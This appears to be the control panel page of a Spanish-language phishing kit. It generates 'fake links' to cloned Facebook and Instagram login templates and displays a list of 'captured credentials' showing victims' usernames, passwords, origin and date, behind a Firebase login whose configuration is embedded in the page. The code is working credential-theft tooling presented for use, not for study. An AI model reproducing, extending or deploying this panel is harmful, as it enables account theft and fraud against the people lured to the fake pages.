<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Herramientas - Proyecto Marilin</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #f0f2f5; margin: 0; padding: 20px; color: #1c1e21; }
        .container { max-width: 800px; margin: 20px auto; padding: 30px; background: white; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
        h1, h3 { color: #0866FF; text-align: center; }
        .subtitle { text-align: center; color: #65676b; font-size: 16px; margin-bottom: 30px; }
        .apps { display: flex; justify-content: center; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
        .app { display: flex; flex-direction: column; align-items: center; justify-content: space-between; text-align: center; padding: 20px; border-radius: 10px; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; border: 1px solid #ddd; width: 150px; }
        .app:hover { transform: translateY(-5px); box-shadow: 0 8px 16px rgba(0,0,0,0.1); }
        .app img { height: 60px; margin-bottom: 10px; }
        .app p { margin: 0; font-size: 14px; font-weight: bold; }
        .generator-section { text-align: center; padding: 20px; background-color: #f5f6f7; border-radius: 8px; margin-top: 20px; }
        .generator-section input { width: 90%; max-width: 500px; padding: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; margin-bottom: 15px; }
        .credentials-section { margin-top: 40px; }
        .credential-item { background-color: #f5f6f7; border: 1px solid #dddfe2; border-radius: 6px; padding: 15px; margin-bottom: 10px; font-size: 14px; word-wrap: break-word; }
        .credential-item span { font-weight: bold; }
        .action-button { background-color: #fa3e3e; color: white; border: none; padding: 12px 25px; border-radius: 6px; font-size: 16px; cursor: pointer; font-weight: bold; display: block; margin: 20px auto 0; }
        .logout { display: block; text-align: center; margin-top: 30px; color: #e41d1d; font-weight: bold; text-decoration: none; }
        /* Estilo para los nuevos botones de abrir */
        .preview-btn {
            background-color: #6c757d;
            color: white;
            text-decoration: none;
            padding: 5px 15px;
            border-radius: 5px;
            font-size: 12px;
            margin-top: 10px;
            display: inline-block;
            font-weight: bold;
        }
        .preview-btn:hover { background-color: #5a6268; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üõ†Ô∏è Herramientas</h1>
        <p class="subtitle">Panel de generaci√≥n de enlaces</p>

        <h3>1. Ingresa la URL final de redirecci√≥n</h3>
        <div class="generator-section">
            <input type="text" id="redirectUrlInput" placeholder="https://www.youtube.com/shorts/...">
        </div>

        <h3>2. Elige la plantilla, copia el enlace o √°brela</h3>
        <div class="apps">
            <div class="app" onclick="generateAndCopyLink('facebook', 'falso.html')">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_(2019).svg" alt="Facebook">
                <p>Facebook</p>
                <a href="falso.html" target="_blank" class="preview-btn" onclick="event.stopPropagation()">Abrir</a>
            </div>
            <div class="app" onclick="generateAndCopyLink('instagram', 'falso2.html')">
                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
                <p>Instagram</p>
                <a href="falso2.html" target="_blank" class="preview-btn" onclick="event.stopPropagation()">Abrir</a>
            </div>
        </div>

        <div class="credentials-section">
            <h3>üîí Credenciales Capturadas</h3>
            <div id="credencialesContainer"></div>
            <button onclick="limpiarCredenciales()" class="action-button">Limpiar Credenciales</button>
        </div>

        <a href="index.html" class="logout">Cerrar sesi√≥n</a>
    </div>

    <script type="module">
        // üî• Importar Firebase y verificar autenticaci√≥n
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";

        // üîê Configuraci√≥n de Firebase (usa la misma que en index.html)
        const firebaseConfig = {
            apiKey: "AIzaSyDfLXKZzH5ycvuKElIeqFLSHs55Bed0rgU",
            authDomain: "red-social-5c814.firebaseapp.com",
            projectId: "red-social-5c814",
            storageBucket: "red-social-5c814.firebasestorage.app",
            messagingSenderId: "982136329739",
            appId: "1:982136329739:web:1f21bc5d94884c4a6bd90e",
            measurementId: "G-1BR67MQN2Q"
        };

        // Inicializar Firebase
        const app = initializeApp(firebaseConfig);
        const auth = getAuth();

        // Verificar si el usuario est√° autenticado
        onAuthStateChanged(auth, (user) => {
            if (!user) {
                // Si no est√° logueado, redirige al login
                window.location.href = "index.html";
            }
            // Si est√° logueado, muestra las credenciales
            mostrarCredenciales();
        });

        // Funci√≥n para generar y copiar el enlace falso
        window.generateAndCopyLink = (brand, fileName) => {
            const redirectUrl = document.getElementById('redirectUrlInput').value.trim();
            if (!redirectUrl) {
                alert('Por favor, ingresa una URL de redirecci√≥n primero.');
                return;
            }

            // Guarda la URL de redirecci√≥n en localStorage
            localStorage.setItem(`${brand}RedirectUrl`, redirectUrl);

            // Genera el enlace falso
            const baseUrl = window.location.href.substring(0, window.location.href.lastIndexOf('/'));
            const fakeUrl = `${baseUrl}/${fileName}`;

            // Copia al portapapeles
            navigator.clipboard.writeText(fakeUrl).then(() => {
                alert(`¬°Enlace para ${brand.charAt(0).toUpperCase() + brand.slice(1)} copiado!\n${fakeUrl}`);
            }).catch(err => {
                alert('Error al copiar el enlace.');
            });
        };

        // Mostrar credenciales capturadas
        window.mostrarCredenciales = () => {
            const container = document.getElementById('credencialesContainer');
            const credenciales = JSON.parse(localStorage.getItem('credenciales') || '[]');
            container.innerHTML = credenciales.length === 0 
                ? '<p style="text-align:center; color:#65676b;">A√∫n no hay datos.</p>' 
                : '';

            credenciales.reverse().forEach(cred => {
                container.innerHTML += `
                    <div class="credential-item">
                        <p><span>Origen:</span> ${cred.origen}</p>
                        <p><span>Usuario:</span> ${cred.usuario}</p>
                        <p><span>Contrase√±a:</span> ${cred.contrasena}</p>
                        <p><span>Fecha:</span> ${cred.fecha}</p>
                    </div>`;
            });
        };

        // Limpiar credenciales
        window.limpiarCredenciales = () => {
            if (confirm('¬øEst√°s seguro de que quieres borrar todas las credenciales?')) {
                localStorage.removeItem('credenciales');
                mostrarCredenciales();
            }
        };
    </script>
</body>
</html>